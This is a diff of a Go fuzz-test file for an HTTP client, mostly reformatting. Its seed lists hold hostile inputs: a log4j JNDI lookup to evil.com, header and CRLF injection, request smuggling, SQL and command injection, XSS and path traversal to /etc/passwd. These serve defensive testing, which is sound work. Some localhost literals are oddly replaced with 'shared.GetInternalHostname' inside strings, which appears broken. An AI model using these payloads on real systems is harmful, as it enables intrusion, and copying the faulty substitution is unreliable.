@@ -31,41 +31,41 @@ func FuzzURLParsing(f *testing.F) {
 		"", // empty URL
 		"://invalid",
 		"http://",
-		"https://example.com:99999/path", // invalid port
+		"https://example.com:99999/path",      // invalid port
 		"http://example.com/../../etc/passwd", // path traversal
-		"http://example.com/path%00.php", // null byte
+		"http://example.com/path%00.php",      // null byte
 		"http://example.com/path%0d%0aInjected-Header: value", // CRLF injection
-		"http://example.com@evil.com", // URL confusion
-		"http://evil.com#@example.com", // fragment confusion
-		"javascript:alert('xss')", // XSS attempt
-		"file:///etc/passwd", // file protocol
-		"gopher://example.com", // gopher protocol
-		"dict://example.com", // dict protocol
-		"ftp://example.com", // ftp protocol
-		"http://example.com:8080@evil.com:9090", // authority confusion
-		"http://example.com\r\nHost: evil.com", // host header injection
-		"http://example.com%2F%2E%2E%2Fetc%2Fpasswd", // encoded traversal
-		"http://example.com/path?cmd=`whoami`", // command injection in query
+		"http://example.com@evil.com",                         // URL confusion
+		"http://evil.com#@example.com",                        // fragment confusion
+		"javascript:alert('xss')",                             // XSS attempt
+		"file:///etc/passwd",                                  // file protocol
+		"gopher://example.com",                                // gopher protocol
+		"dict://example.com",                                  // dict protocol
+		"ftp://example.com",                                   // ftp protocol
+		"http://example.com:8080@evil.com:9090",               // authority confusion
+		"http://example.com\r\nHost: evil.com",                // host header injection
+		"http://example.com%2F%2E%2E%2Fetc%2Fpasswd",          // encoded traversal
+		"http://example.com/path?cmd=`whoami`",                // command injection in query
 		"http://example.com/path?q=<script>alert(1)</script>", // XSS in query
-		"http://127.0.0.1:8080", // localhost
-		"http://0.0.0.0:8080", // all interfaces
-		"http://[::ffff:127.0.0.1]", // IPv4-mapped IPv6
-		strings.Repeat("http://a", 1000) + ".com", // long URL
-		"http://" + strings.Repeat("a", 255) + ".com", // long hostname
-		"http://example.com/" + strings.Repeat("a", 10000), // long path
-		"http://example.com?" + strings.Repeat("a=b&", 1000), // many params
-		"http://☃.com", // unicode domain
-		"http://xn--n3h.com", // punycode
-		"http://example.com\x00", // null byte variant
-		"http://example.com%00", // encoded null
-		"http://example.com/../../../", // multiple traversals
-		"http://example.com/./././", // dot segments
-		"http://example.com//path", // double slash
-		"http://example.com\\" + "path", // backslash
-		"http://example.com:80:80", // double port
-		"http://[email:protected]", // email-like userinfo
-		"http://example.com?redirect=http://evil.com", // open redirect
-		"http://example.com#<img src=x onerror=alert(1)>", // XSS in fragment
+		"http://shared.GetInternalHostname:8080",              // localhost
+		"http://0.0.0.0:8080",                                 // all interfaces
+		"http://[::ffff:shared.GetInternalHostname]",          // IPv4-mapped IPv6
+		strings.Repeat("http://a", 1000) + ".com",             // long URL
+		"http://" + strings.Repeat("a", 255) + ".com",         // long hostname
+		"http://example.com/" + strings.Repeat("a", 10000),    // long path
+		"http://example.com?" + strings.Repeat("a=b&", 1000),  // many params
+		"http://☃.com",                                        // unicode domain
+		"http://xn--n3h.com",                                  // punycode
+		"http://example.com\x00",                              // null byte variant
+		"http://example.com%00",                               // encoded null
+		"http://example.com/../../../",                        // multiple traversals
+		"http://example.com/./././",                           // dot segments
+		"http://example.com//path",                            // double slash
+		"http://example.com\\" + "path",                       // backslash
+		"http://example.com:80:80",                            // double port
+		"http://[email:protected]",                            // email-like userinfo
+		"http://example.com?redirect=http://evil.com",         // open redirect
+		"http://example.com#<img src=x onerror=alert(1)>",     // XSS in fragment
 	}
 
 	for _, seed := range seeds {
@@ -80,7 +80,7 @@ func FuzzURLParsing(f *testing.F) {
 
 		config := DefaultConfig()
 		config.Timeout = 100 * time.Millisecond
-		
+
 		client, err := NewClient(config)
 		if err != nil {
 			t.Fatal(err)
@@ -104,15 +104,15 @@ func FuzzURLParsing(f *testing.F) {
 				if scheme != "http" && scheme != "https" {
 					t.Errorf("Non-HTTP(S) scheme accepted: %s", scheme)
 				}
-				
+
 				// Check for localhost/internal network access
 				host := strings.ToLower(u.Hostname())
-				if strings.Contains(host, "localhost") || 
-				   strings.HasPrefix(host, "127.") ||
-				   strings.HasPrefix(host, "192.168.") ||
-				   strings.HasPrefix(host, "10.") ||
-				   strings.HasPrefix(host, "172.") ||
-				   host == "0.0.0.0" {
+				if strings.Contains(host, "localhost") ||
+					strings.HasPrefix(host, "127.") ||
+					strings.HasPrefix(host, "192.168.") ||
+					strings.HasPrefix(host, "10.") ||
+					strings.HasPrefix(host, "172.") ||
+					host == "0.0.0.0" {
 					t.Logf("Warning: Internal network access allowed: %s", host)
 				}
 			}
@@ -139,26 +139,26 @@ func FuzzHeaderInjection(f *testing.F) {
 		{"Authorization", "Bearer token\r\nX-Injected: malicious"},
 		{"X-Test\r\nX-Injected", "malicious"},
 		{"X-Test\nX-Injected", "malicious"},
-		{"X-Test", strings.Repeat("a", 10000)}, // long value
-		{"X-" + strings.Repeat("a", 1000), "value"}, // long name
-		{"X-Test", "value\x00injected"}, // null byte
-		{"X-Test", "value\r\n\r\nGET /admin HTTP/1.1"}, // request smuggling
-		{"Transfer-Encoding", "chunked\r\nContent-Length: 0"}, // TE.CL
+		{"X-Test", strings.Repeat("a", 10000)},                 // long value
+		{"X-" + strings.Repeat("a", 1000), "value"},            // long name
+		{"X-Test", "value\x00injected"},                        // null byte
+		{"X-Test", "value\r\n\r\nGET /admin HTTP/1.1"},         // request smuggling
+		{"Transfer-Encoding", "chunked\r\nContent-Length: 0"},  // TE.CL
 		{"Content-Length", "10\r\nTransfer-Encoding: chunked"}, // CL.TE
-		{"X-Forwarded-For", "127.0.0.1\r\nX-Admin: true"},
-		{"X-Test", "${jndi:ldap://evil.com/a}"}, // log4j style
-		{"X-Test", "{{7*7}}"}, // template injection
-		{"X-Test", "<script>alert(1)</script>"}, // XSS
-		{"X-Test", "'; DROP TABLE users; --"}, // SQL injection
-		{"X-Test", "`echo pwned`"}, // command injection
-		{"X-Test", "$(echo pwned)"}, // command injection
-		{"X-Test", "|echo pwned"}, // command injection
-		{"X-Test", ";echo pwned"}, // command injection
+		{"X-Forwarded-For", "shared.GetInternalHostname\r\nX-Admin: true"},
+		{"X-Test", "${jndi:ldap://evil.com/a}"},    // log4j style
+		{"X-Test", "{{7*7}}"},                      // template injection
+		{"X-Test", "<script>alert(1)</script>"},    // XSS
+		{"X-Test", "'; DROP TABLE users; --"},      // SQL injection
+		{"X-Test", "`echo pwned`"},                 // command injection
+		{"X-Test", "$(echo pwned)"},                // command injection
+		{"X-Test", "|echo pwned"},                  // command injection
+		{"X-Test", ";echo pwned"},                  // command injection
 		{"X-Test", "\"><script>alert(1)</script>"}, // XSS variant
-		{"X-Test", "../../../etc/passwd"}, // path traversal
-		{"X-Test", "\\r\\n\\r\\n"}, // escaped CRLF
-		{"X-Test", "%0d%0a%0d%0a"}, // URL encoded CRLF
-		{"X-Test", "\u000d\u000a"}, // Unicode CRLF
+		{"X-Test", "../../../etc/passwd"},          // path traversal
+		{"X-Test", "\\r\\n\\r\\n"},                 // escaped CRLF
+		{"X-Test", "%0d%0a%0d%0a"},                 // URL encoded CRLF
+		{"X-Test", "\u000d\u000a"},                 // Unicode CRLF
 	}
 
 	for _, seed := range seeds {
@@ -179,7 +179,7 @@ func FuzzHeaderInjection(f *testing.F) {
 					t.Errorf("Header injection detected: %s", name)
 				}
 			}
-			
+
 			// Echo headers back
 			for name, values := range r.Header {
 				for _, value := range values {
@@ -268,20 +268,20 @@ func FuzzAuthenticationBypass(f *testing.F) {
 
 	f.Fuzz(func(t *testing.T, authType, token, username, password string) {
 		// Skip invalid UTF-8
-		if !utf8.ValidString(authType) || !utf8.ValidString(token) || 
-		   !utf8.ValidString(username) || !utf8.ValidString(password) {
+		if !utf8.ValidString(authType) || !utf8.ValidString(token) ||
+			!utf8.ValidString(username) || !utf8.ValidString(password) {
 			t.Skip("Invalid UTF-8 string")
 		}
 
 		// Create server that validates auth
 		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 			auth := r.Header.Get("Authorization")
-			
+
 			// Check for injection attempts in auth header
 			if strings.Contains(auth, "\r") || strings.Contains(auth, "\n") {
 				t.Errorf("CRLF injection in Authorization header: %q", auth)
 			}
-			
+
 			// Simple auth check (in real app would be more complex)
 			if auth == "Bearer valid-token" || auth == "Basic dXNlcjpwYXNz" {
 				w.WriteHeader(http.StatusOK)
@@ -317,7 +317,7 @@ func FuzzAuthenticationBypass(f *testing.F) {
 			// Verify this is legitimate auth
 			if authType != "bearer" || token != "valid-token" {
 				if authType != "basic" || username != "user" || password != "pass" {
-					t.Logf("Potential auth bypass: type=%s, token=%s, user=%s", 
+					t.Logf("Potential auth bypass: type=%s, token=%s, user=%s",
 						authType, token, username)
 				}
 			}
@@ -345,7 +345,7 @@ func FuzzTLSConfig(f *testing.F) {
 		{tls.VersionTLS12, tls.VersionTLS13, false, []uint16{
 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, // strong cipher
 		}},
-		{65535, 65535, false, nil}, // invalid version
+		{65535, 65535, false, nil},                                   // invalid version
 		{tls.VersionTLS12, tls.VersionTLS13, false, []uint16{65535}}, // invalid cipher
 	}
 
@@ -362,13 +362,13 @@ func FuzzTLSConfig(f *testing.F) {
 		}
 
 		_, err := NewClient(config)
-		
+
 		// Check for weak TLS configurations
 		if err == nil {
 			if minVersion < tls.VersionTLS12 && minVersion != 0 {
 				t.Logf("Warning: Weak TLS version allowed: %d", minVersion)
 			}
-			
+
 			if insecureSkipVerify {
 				t.Log("Warning: TLS verification disabled")
 			}
@@ -385,17 +385,17 @@ func FuzzRequestBody(f *testing.F) {
 		`{"key": "value"}`,
 		`<?xml version="1.0"?><root></root>`,
 		strings.Repeat("a", 1024*1024), // 1MB
-		"\x00\x01\x02\x03", // binary data
+		"\x00\x01\x02\x03",             // binary data
 		"Content-Length: 0\r\n\r\nGET /admin HTTP/1.1", // request smuggling
-		"0\r\n\r\n", // chunked encoding terminator
-		"${jndi:ldap://evil.com/a}", // log4j
-		"{{7*7}}", // template injection
-		"<script>alert(1)</script>", // XSS
-		"'; DROP TABLE users; --", // SQL injection
-		"`echo pwned`", // command injection
-		"../../../etc/passwd", // path traversal
-		"%00", // null byte
-		"\r\n\r\n", // CRLF
+		"0\r\n\r\n",                       // chunked encoding terminator
+		"${jndi:ldap://evil.com/a}",       // log4j
+		"{{7*7}}",                         // template injection
+		"<script>alert(1)</script>",       // XSS
+		"'; DROP TABLE users; --",         // SQL injection
+		"`echo pwned`",                    // command injection
+		"../../../etc/passwd",             // path traversal
+		"%00",                             // null byte
+		"\r\n\r\n",                        // CRLF
 		strings.Repeat("x", 10*1024*1024), // 10MB - large payload
 	}
 
@@ -414,17 +414,17 @@ func FuzzRequestBody(f *testing.F) {
 			if r.ContentLength < 0 {
 				t.Error("Negative content length")
 			}
-			
+
 			// Try to read body
 			buf := make([]byte, 1024)
 			n, _ := r.Body.Read(buf)
-			
+
 			// Check for smuggling attempts
 			bodyStr := string(buf[:n])
 			if strings.Contains(bodyStr, "HTTP/1.1") {
 				t.Error("HTTP request smuggling attempt detected")
 			}
-			
+
 			w.WriteHeader(http.StatusOK)
 		}))
 		defer server.Close()
@@ -441,7 +441,7 @@ func FuzzRequestBody(f *testing.F) {
 		if resp != nil {
 			resp.Body.Close()
 		}
-		
+
 		// Very large bodies might timeout, which is OK
 		if err != nil && !strings.Contains(err.Error(), "timeout") {
 			// Log unexpected errors
@@ -462,9 +462,9 @@ func FuzzRetryLogic(f *testing.F) {
 	}{
 		{3, 100, 1000, 2.0},
 		{0, 0, 0, 0},
-		{100, 1, 1, 1.0}, // excessive retries
+		{100, 1, 1, 1.0},         // excessive retries
 		{10, 10000, 60000, 10.0}, // long delays
-		{-1, -100, -1000, -2.0}, // negative values
+		{-1, -100, -1000, -2.0},  // negative values
 		{10, 1, 1000000, 1000.0}, // huge multiplier
 	}
 
@@ -522,7 +522,7 @@ func FuzzRetryLogic(f *testing.F) {
 
 		// Check for DoS potential
 		if elapsed > 5*time.Second {
-			t.Logf("Warning: Long retry duration: %v with config maxRetries=%d", 
+			t.Logf("Warning: Long retry duration: %v with config maxRetries=%d",
 				elapsed, maxRetries)
 		}
 	})
